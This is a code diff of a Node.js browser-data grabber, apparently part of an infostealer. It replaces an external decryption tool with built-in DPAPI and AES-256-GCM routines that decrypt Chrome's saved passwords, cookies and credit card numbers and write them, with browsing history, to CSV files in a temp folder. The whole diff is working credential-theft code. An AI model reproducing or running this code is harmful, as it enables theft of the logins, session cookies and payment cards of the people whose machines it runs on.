@@ -2,40 +2,66 @@ const { existsSync, copyFileSync, mkdirSync, rmSync } = require('fs');
 const { join, sep } = require('path');
 const { randomFileCreator } = require('../util/dir');
 const { execSync, exec } = require('child_process');
-const { addDoubleQuotes } = require('../util/string');
 const { sleep } = require('../util/general');
 const { browsers, browsersProcesses } = require('../util/variables');
 const fs = require('fs');
 const csv = require('csv');
 const { getTempFolder } = require('../util/init');
 const sqlite3 = require('sqlite3');
+const crypto = require('crypto');
+const { Dpapi } = require('@primno/dpapi');
 
 const filesToDelete = [];
-const toolPath = addDoubleQuotes(join(getTempFolder(), 'decrypt_key.exe'));
 
-/**
- * @param {string} name
- * @param {string} path
- * @param {string} use
- * @param {string} filename
- * @param {(dbFile: string, csvFile: string) => void} dbData
- * @param {string} [profile]
- */
-const _ = (name, path, use, filename, dbData, profile = 'Default') => {
+const decryptKey = (localState) => {
+  const encryptedKey = JSON.parse(fs.readFileSync(localState, 'utf8')).os_crypt.encrypted_key;
+  const encrypted = Buffer.from(encryptedKey, 'base64').slice(5);
+  return Dpapi.unprotectData(Buffer.from(encrypted, 'utf8'), null, 'CurrentUser');
+};
+
+const _chrome = (name, path, use, columns, table, rowsNames, filename, profile = 'Default', encrypted) => {
+  const originalPath = path;
   path += join(sep, profile, use);
   if (!existsSync(path)) return;
 
   if (!existsSync(join(getTempFolder(), 'Browsers', name))) mkdirSync(join(getTempFolder(), 'Browsers', name));
-  const file = join(getTempFolder(), 'Browsers', name, `${filename}.csv`);
   const dbFile = randomFileCreator();
   filesToDelete.push(dbFile);
   try {
     copyFileSync(path, dbFile);
   } catch (e) {
     // File is locked or busy
+    return;
   }
+  const db = new sqlite3.Database(dbFile);
+  const file = join(getTempFolder(), 'Browsers', name, `${filename}.csv`);
+  const csvFile = csv.stringify({ columns: rowsNames, header: true });
+  const key = decryptKey(join(originalPath, 'Local State'));
 
-  dbData(dbFile, file);
+  db.serialize(() => {
+    db.each(`SELECT ${columns.map((c, i) => `${c} ${rowsNames[i]}`).join(', ')} FROM ${table}`, (err, row) => {
+      if (err) throw err;
+
+      if (encrypted && row[encrypted]) {
+        let decrypted;
+        const encryptedValue = row[encrypted];
+        const start = encryptedValue.slice(3, 15);
+        const middle = encryptedValue.slice(15, encryptedValue.length - 16);
+        const end = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
+        const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
+        decipher.setAuthTag(end);
+        decrypted = decipher.update(middle, 'base64', 'utf8') + decipher.final('utf8');
+
+        row[encrypted] = decrypted;
+      }
+      csvFile.write(row);
+    });
+  });
+
+  csvFile.pipe(fs.createWriteStream(file)).on('finish', () => {
+    db.close();
+    csvFile.destroy();
+  });
 };
 
 const _ff = (path, profile, filename, use, columns, table) => {
@@ -70,39 +96,29 @@ const firefox = {
 
 const chrome = {
   passwords: (name, path, profile) => {
-    return _(name, path, 'Login Data', 'Logins', (dbFile, csvFile) => exec(
-      [
-        toolPath, `--path "${path}"`, `--db-file "${dbFile}"`, '--sql "SELECT origin_url, username_value, password_value FROM logins"',
-        `--csv-file "${csvFile}"`, '--rows "url,username,password"', '--decrypt-row 2'
-      ].join(' ')
-    ), profile);
+    return _chrome(
+      name, path, 'Login Data', ['origin_url', 'username_value', 'password_value'], 'logins',
+      ['url', 'username', 'password'], 'Logins', profile, 'password'
+    );
   },
   history: (name, path, profile) => {
-    return _(name, path, 'History', 'History', (dbFile, csvFile) => exec(
-      [
-        toolPath, `--path "${path}"`, `--db-file "${dbFile}"`, '--sql "SELECT url, title FROM urls"',
-        `--csv-file "${csvFile}"`, '--rows "url,title"'
-      ].join(' ')
-    ), profile);
+    return _chrome(
+      name, path, 'History', ['url', 'title'], 'urls', ['url', 'title'],
+      'History', profile
+    );
   },
   creditCards: (name, path, profile) => {
-    return _(name, path, 'Web Data', 'Credit Cards', (dbFile, csvFile) => exec(
-      [
-        toolPath, `--path "${path}"`, `--db-file "${dbFile}"`,
-        '--sql "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"',
-        `--csv-file "${csvFile}"`, '--rows "name on card,expiration month,expiration year,card number"', '--decrypt-row 3'
-      ].join(' ')
-    ), profile);
+    return _chrome(
+      name, path, 'Web Data', ['name_on_card', 'expiration_month', 'expiration_year', 'card_number_encrypted'],
+      'credit_cards', ['name', 'expiration_month', 'expiration_year', 'card_number'], 'Credit Cards', profile,
+      'card_number'
+    );
   },
   cookies: (name, path, profile) => {
-    return _(name, path, join('Network', 'Cookies'), 'Cookies', (dbFile, csvFile) => exec(
-      [
-        toolPath, `--path "${path}"`, `--db-file "${dbFile}"`,
-        '--sql "SELECT host_key, name, encrypted_value FROM cookies"',
-        `--csv-file "${csvFile}"`, '--rows "host,name,value"',
-        '--decrypt-row 2'
-      ].join(' ')
-    ), profile);
+    return _chrome(
+      name, path, join('Network', 'Cookies'), ['host_key', 'name', 'encrypted_value'], 'cookies',
+      ['host', 'name', 'value'], 'Cookies', profile, 'value'
+    );
   }
 };
 
